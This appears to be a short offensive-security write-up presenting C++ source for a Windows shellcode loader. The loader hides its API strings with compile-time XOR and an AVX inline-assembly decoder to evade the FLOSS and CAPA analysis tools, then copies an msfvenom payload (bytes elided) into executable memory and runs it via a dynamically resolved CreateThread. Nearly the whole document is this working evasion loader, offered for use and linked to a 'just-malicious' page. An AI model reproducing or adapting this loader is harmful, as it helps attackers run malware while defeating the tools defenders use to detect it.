
## FLOSS and CAPA Bypass w/ AVX XOR obfuscation

Thanks to 0xTriboulet.

Example code:

```C++
// x86_64-w64-mingw32-g++ exotic_xor_mk4.cpp -O0 -s -o exotic_xor_mk4.exe -masm=intel -nostdlib -lkernel32
// mk1,2, and 3 available on https://patreon.com/0xtriboulet

#include <stdio.h>
#include <windows.h>

#define KEY ((((__TIME__[7] - '0') * 1 + (__TIME__[6] - '0') * 10 \
                   + (__TIME__[4] - '0') * 60 + (__TIME__[3] - '0') * 600 \
                   + (__TIME__[1] - '0') * 3600 + (__TIME__[0] - '0') * 36000) & 0xFF))

// 
/*
 * This macro is a lambda function to pack all required steps into one single command
 * when defining strings.
 */
#define STR(str) \
    []() -> char* __attribute__((always_inline)) { \
        constexpr auto size = sizeof(str)/sizeof(str[0]); \
        obfuscator<size> obfuscated_str(str); \
        static char original_string[size] = {0}; \
        obfuscated_str.deobfuscate((unsigned char *)original_string); \
        return original_string; \
    }()
	
// MemCopy prototype	
VOID * MemCopy (VOID *dest, CONST VOID *src, SIZE_T len);

template <UINT N>
struct obfuscator {
    /*
     * m_data stores the obfuscated string.
     */
    UCHAR m_data[N] = {0};
  
    /*
     * Using constexpr ensures that the strings will be obfuscated in this
     * constructor function at compile time.
     */
    constexpr obfuscator(CONST CHAR* data) {
        /*
         * Implement encryption algorithm here.
         * Here we have simple XOR algorithm.
         */
        for (UINT i = 0; i < N; i++) {
            m_data[i] = data[i] ^ KEY;
        }
    }
	
    /*
     * deobfuscate decrypts the strings. Implement decryption algorithm here.
     * Here we have a simple XOR algorithm.
     */
    VOID deobfuscate(UCHAR * des) CONST{
        UINT i = 0;
        do {
            // des[i] = m_data[i] ^ KEY;
	__asm__(
		"vmovd xmm1, %[source];"                             // Move source to xmm1
		"vmovd xmm2, %[key];"                                // Move key to xmm2
		"vpxor xmm0, xmm1, xmm2;"                            // XOR xmm1 and xmm2, result in xmm0
		"vmovd %[destination], xmm0;"                        // Move result from xmm0 to destination
		: [destination] "=m" (*(UINT*)&des[i])               // Ensure correct size
		: [source] "m" (*(UINT*)&m_data[i]), [key] "r" (KEY) // Pass in source and KEY
		: "xmm0", "xmm1", "xmm2"                             // Clobbered registers
	);
			
            i++;
        } while (des[i-1]);
    }
	
	
};


typedef HANDLE (WINAPI * CreateThread_t)(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  __drv_aliasesMem LPVOID lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);

// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f rust
UCHAR ucPayload[] = {...snip...};

SIZE_T szPayload = sizeof(ucPayload);

INT __main(){
	
    LPVOID  lpExecMem = NULL;

	
    // allocate memory
    lpExecMem = VirtualAlloc(NULL,szPayload,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // copy memory
    MemCopy(lpExecMem, ucPayload, szPayload);
    
	// resolve CreateThread
	CreateThread_t pCreateThread = (CreateThread_t) GetProcAddress(GetModuleHandle(STR("kernel32")),STR("CreateThread"));
	
    // create thread
    HANDLE hThread = NULL;
    hThread = pCreateThread(NULL,0x0,(LPTHREAD_START_ROUTINE)lpExecMem, NULL, 0x0, NULL);

    // wait
    WaitForSingleObject(hThread, INFINITE);
    
    return 0;
}


// Just to get rid of CRT
VOID * MemCopy (VOID *dest, CONST VOID *src, SIZE_T len){
  UCHAR * d = (UCHAR *) dest;
  CONST UCHAR* s = (UCHAR *) src;
  while (len--){
    *d++ = *s++;
  }
  return dest;
}
}
```

Details:

https://steve-s.gitbook.io/0xtriboulet/just-malicious/advanced-string-obfuscation

